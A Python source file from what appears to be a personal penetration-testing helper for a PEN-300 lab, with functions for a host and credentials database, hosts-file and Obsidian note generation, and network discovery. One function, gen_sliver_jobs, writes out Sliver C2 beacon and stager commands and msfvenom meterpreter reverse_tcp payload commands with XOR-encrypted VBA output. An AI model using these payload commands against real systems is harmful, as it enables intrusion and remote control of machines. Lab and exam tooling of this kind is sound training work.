"""
All other functions which cannot be attributed to a category
"""
from models import Credentials, Host
from app import db
import log
import hh.utils
from datetime import datetime
import hh.tools
import os
import hh.tmux
import questionary
from config import cfg
from libnmap.parser import NmapParser
import hh.network_discover


def clear():
    """
    Clears the database
    """
    deleted_creds = db.session.query(Credentials).delete()
    deleted_hosts = db.session.query(Host).delete()
    log.warning(f'Deleted {deleted_creds} Credentials')
    log.warning(f'Deleted {deleted_hosts} Hosts')

    db.session.commit()
    db.session.flush()


def verify_tools():
    """
    No clue if this is a good idea
    List of all 3rd party tools
    """

    for tool in hh.tools.all_tools:
        tool.verify()


def gen_sliver_jobs():
    profile_port = cfg.SLIVER_MTLS_PORT
    stager_port32 = cfg.SLIVER_STAGER_PORT_32
    stager_port64 = cfg.SLIVER_STAGER_PORT_64

    ip = hh.utils.get_ip()
    elf_path = os.path.join(os.getcwd(), f'beacon_{ip}_{profile_port}.elf')
    sliver_template = f"""profiles new beacon --mtls {ip}:{profile_port} --format shellcode --seconds 5 --arch 386 aesir-shellcode-32
profiles new beacon --mtls {ip}:{profile_port} --format shellcode --arch amd64 --seconds 5 aesir-shellcode-64
stage-listener -u tcp://{ip}:{stager_port32} -p aesir-shellcode-32
stage-listener -u tcp://{ip}:{stager_port64} -p aesir-shellcode-64
mtls -L {ip} -l {profile_port}
generate beacon --os linux --arch amd64 --format ELF --mtls {ip}:{profile_port} --save {elf_path} -G --seconds 5 --skip-symbols
"""
    msfvenom_playload = f"""[32bit]
msfvenom -p windows/meterpreter/reverse_tcp LHOST=tun0 LPORT={stager_port32} -f csharp  | xsel -bi
msfvenom -p windows/meterpreter/reverse_tcp LHOST=tun0 LPORT={stager_port32} EXITFUNC=thread -f vbapplication --encrypt xor --encrypt-key 'CHANGEMYKEY

[64bit]
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=tun0 LPORT={stager_port64} -f csharp  | xsel -bi
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=tun0 LPORT={stager_port64} EXITFUNC=thread -f vbapplication --encrypt xor --encrypt-key 'CHANGEMYKEY

[linux - binary]
generate beacon --os linux --arch amd64 --format ELF --mtls {ip}:{profile_port} --save /tmp/beacon.elf -G --seconds 5 --skip-symbols
"""

    hh.utils.pandc(sliver_template)
    print(msfvenom_playload)

    pane = hh.tmux.get_sliver_pane()
    # pane.send_keys(sliver_template)


def change_octet():
    """
    The octet of the targets changes on lab reset (sometimes)
    I don't want to rescan my hosts everytime so this function does:
    1) Get all hosts
        a) get folder of each host, changes the octet
        b) edits the xml on disk
        c) eidts the xml in database
    """
    hosts = db.session.query(Host).all()

    octet = questionary.text('New octet').ask()
    if not octet:
        return

    for host in hosts:
        old_ip = host.address.split('.')

        # switch octet
        old_ip[2] = octet
        new_ip = '.'.join(old_ip)
        log.success(f'Old: {host.address} :: New: {new_ip}')

        # not changing xml on disk too much work
        host.nmap_xml = host.nmap_xml.replace(host.address, new_ip)
        host.address = new_ip
        db.session.commit()


def override_ip():
    """
    Hooks the function hh.utils.get_ip() with the input 
    """

    new_ip = questionary.text('New IP').ask()

    if new_ip == '':
        cfg.OVERRIDE_IP = None
    else:
        cfg.OVERRIDE_IP = new_ip


def gen_hosts():
    """Geneates a template to be pasted into /etc/hosts"""
    hosts = db.session.query(Host).all()
    output = ''
    for host in hosts:
        output += f'{host.address} {hh.utils.empty_if_none(host.name)} {hh.utils.empty_if_none(host.fqdn)}\n'

    hh.utils.pandc(output)


def gen_mdtable():
    """
    Generates an overview page with tables and links
    """
    table = """| IP | Name | FQND |
|-|-|-|
"""
    hosts = db.session.query(Host).all()
    for host in hosts:

        pretty_address = host.address
        if host.name:
            pretty_address = f'{host.address} - {host.name}'

        line = f'| [[{pretty_address}]] | {hh.utils.empty_if_none(host.name)} | {hh.utils.empty_if_none(host.fqdn)} |\n'
        table += line

    print(table)


def gen_mdnotes():
    """
    Generates Markdown Note structure for Obsidian
    
    NOTE: not a good idea, don't like subfolders
    """
    hosts = db.session.query(Host).all()
    for host in hosts:
        pretty_address = host.address
        if host.name:
            pretty_address = f'{host.address} - {host.name}'
        file_name = os.path.join(os.getcwd(), pretty_address + '.md')
        date = datetime.now().strftime('%Y-%m-%d %H:%M')
        content = f"""---
created: {date}
tags: pen-300/exam
---
# {host.address}

# Attack Chain

# User

# Root

# Pillage

## Flags

| User | Root |
| -----| ---- |
|      |      |
|      |      |

"""
        # ignore if exist
        if os.path.exists(file_name):
            continue

        log.debug(f'Creating notes for {host.address}')

        with open(file_name, 'w') as f:
            f.write(content)


def discover_network():
    """
    Uses netexec to discover the target network and populates
    the database with name and fqdn of the found hosts.
    """
    target = questionary.text('Network to scan').ask()
    hosts = hh.network_discover.discover(target)
    for ip, host in hosts.items():
        # lookup and if better override
        host_db = Host.query.filter_by(address=ip).first()
        if host_db:
            log.info(f'Updating {host_db.address}')
            if host_db.name == None:
                host_db.name = host.name
            if host_db.fqdn == None and host.fqdn:
                host_db.fqdn = host.fqdn
            db.session.commit()
        else:
            log.info(f'Found {ip} which is not in the DB! ({ip} {host.name} {host.fqdn})')
